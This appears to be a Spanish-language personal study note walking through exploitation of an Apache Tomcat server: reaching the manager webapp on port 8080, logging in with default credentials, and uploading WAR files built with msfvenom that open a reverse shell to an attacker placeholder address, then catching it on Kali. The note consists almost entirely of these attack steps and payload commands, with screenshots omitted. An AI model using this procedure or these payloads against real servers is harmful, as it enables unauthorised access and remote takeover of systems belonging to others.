- Explotar servidor Apache tomcat.
- Por lo general esta vulnerabilidad se puede encontrar en el puerto 8080, ahí mismo vemos que es un apache tomcat.
![[Pasted image 20241220151757.png]]
- Vamos a la pagina
- Cuando uno instala un ==tomcat==, por defecto sale esto:
![[Pasted image 20241220151912.png]]
- Si apretamos en ==manager webapp==, nos saldrá un login donde se podría configurar el ==tomcat==.
![[Pasted image 20241220152047.png]]
- Cuando se instala un ==tomcat==, por defecto ya viene con unas credenciales por defecto.
- Para saber la lista de estas credenciales vamos a ingresar a una URL lo siguiente:
```
hacktricks apache tomcat default credentials
```
![[Pasted image 20241220152411.png]]
- Tenemos las posibles credenciales.
- Ya estando dentro, tenemos un lugar donde subir archivos.
![[Pasted image 20241220152645.png]]
- Vamos a hacer un paloads con ==msfvenom==.
```
msfvenom -p java/shell_reverse_tcp LHOST=(IP_ATACANTE) LPORT=443 -f war -o (NOMBRE)
```
==IMPORTANTE, APACHE FUNCIONA CON JAVA==
![[Pasted image 20241220153257.png]]
- Listo el payloads.
- Es recomendado crear 2, así si uno no funciona el otro lo ara.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP_ATACANTE) LPORT=443 -f war -o (NOMBRE)
```
- La diferencia es que la primera es /shell y el segundo es /jsp.
![[Pasted image 20241220153608.png]]
- Probamos.
![[Pasted image 20241220153703.png]]
- Subimos los dos payloads, vamos a probar cual nos sirve.
- Dejamos Kali en escucha.
- El primero si nos dejo hacer el reverse y el segundo, no.
![[Pasted image 20241220153909.png]]